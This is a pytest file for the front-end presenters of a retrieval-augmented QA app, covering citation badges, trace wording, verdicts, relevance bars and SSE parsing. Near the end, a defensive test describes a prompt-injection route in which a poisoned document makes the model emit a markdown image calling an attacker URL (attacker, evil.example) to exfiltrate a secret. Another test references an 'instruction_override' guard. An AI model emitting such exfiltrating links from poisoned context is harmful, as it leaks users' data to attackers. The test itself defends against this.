"""Pure UI logic (no Streamlit import): citation badges, trace wording, verdicts,
the relevance-floor bars, and the SSE event parser."""
from frontend.services.backend_client import parse_sse
from frontend.services.presenters import (
    cite_markdown,
    citing_sentences,
    floor_bars_html,
    step_line,
    trace_summary,
    verdict,
)


def test_citations_become_badges_and_dangling_ones_are_flagged():
    md = cite_markdown("RAG retrieves [1]. Embeddings [2][3]. See [docs](http://x) [9].", n_sources=3)
    assert ":green-badge[1]" in md and ":green-badge[2]" in md and ":green-badge[3]" in md
    assert ":orange-badge[9 · no source]" in md
    assert "[docs](http://x)" in md  # markdown links untouched


def test_citing_sentences():
    answer = "RAG retrieves documents [1]. It reduces cost [2]. Both help [1][2]."
    assert citing_sentences(answer, 1) == ["RAG retrieves documents [1].", "Both help [1][2]."]


def test_gate_line_explains_the_floor_both_ways():
    kept = step_line({"id": "gate", "status": "done", "ms": None,
                      "detail": {"scores": [0.6, 0.4, 0.1], "floor": 0.2, "kept": 2, "web": 0, "abstain": False}})
    assert "2 of 3" in kept and "0.20" in kept
    none = step_line({"id": "gate", "status": "done", "ms": None,
                      "detail": {"scores": [0.1], "floor": 0.2, "kept": 0, "web": 0, "abstain": True}})
    assert "Nothing cleared the relevance floor" in none


def test_crag_guard_outcomes_read_plainly():
    skipped = step_line({"id": "correct", "status": "done", "ms": None,
                         "detail": {"iterations": 0, "action": "skipped:instruction_override"}})
    assert "instruction" in skipped
    rejected = step_line({"id": "correct", "status": "done", "ms": None,
                          "detail": {"iterations": 1, "action": "rewrite_rejected:new_facts"}})
    assert "original question" in rejected


def test_running_generation_shimmers():
    assert ":shimmer[" in step_line({"id": "generate", "status": "running", "ms": None, "detail": {}})


def test_trace_summary_and_verdicts():
    assert trace_summary(abstained=True, total_ms=420, n_sources=0).startswith("Abstained")
    assert "5 sources" in trace_summary(abstained=False, total_ms=3200, n_sources=5)
    assert verdict({"insufficient_context": True})[0] == "orange"
    assert verdict({"grounded": True, "faithfulness_score": 0.95})[0] == "green"
    assert verdict({"grounded": False, "faithfulness_score": 0.4})[0] == "red"
    assert verdict({"grounded": None})[0] == "gray"


def test_floor_bars_mark_kept_and_dropped_passages():
    html = floor_bars_html([0.62, 0.15], floor=0.2, dark=False)
    assert html.count('data-kept="true"') == 1 and html.count('data-kept="false"') == 1
    assert "relevance floor 0.20" in html


def test_parse_sse_yields_typed_events_and_ignores_unknown():
    lines = [
        "event: step", 'data: {"id": "retrieve", "status": "done"}', "",
        "event: token", 'data: {"text": "Hel"}', "",
        "event: token", 'data: {"text": "lo"}', "",
        "event: ping", "data: {}", "",
        "event: done", 'data: {"answer": "Hello"}', "",
    ]
    assert list(parse_sse(lines)) == [
        ("step", {"id": "retrieve", "status": "done"}),
        ("token", "Hel"), ("token", "lo"),
        ("done", {"answer": "Hello"}),
    ]


def test_parse_sse_raises_on_error_event():
    import pytest

    with pytest.raises(RuntimeError, match="LLM generation failed"):
        list(parse_sse(["event: error", 'data: {"message": "LLM generation failed."}', ""]))


def test_answer_markdown_images_are_stripped():
    """A poisoned document can make the model emit ![](https://attacker/?q=secret);
    rendering it would make every viewer's browser call that URL."""
    from frontend.services.presenters import cite_markdown

    md = cite_markdown("See ![x](https://evil.example/p.png?q=1) here [1].", n_sources=1)
    assert "evil.example" not in md and "(image removed)" in md


def test_skipped_generation_has_no_trace_line():
    assert step_line({"id": "generate", "status": "skipped", "ms": None, "detail": {}}) == ""
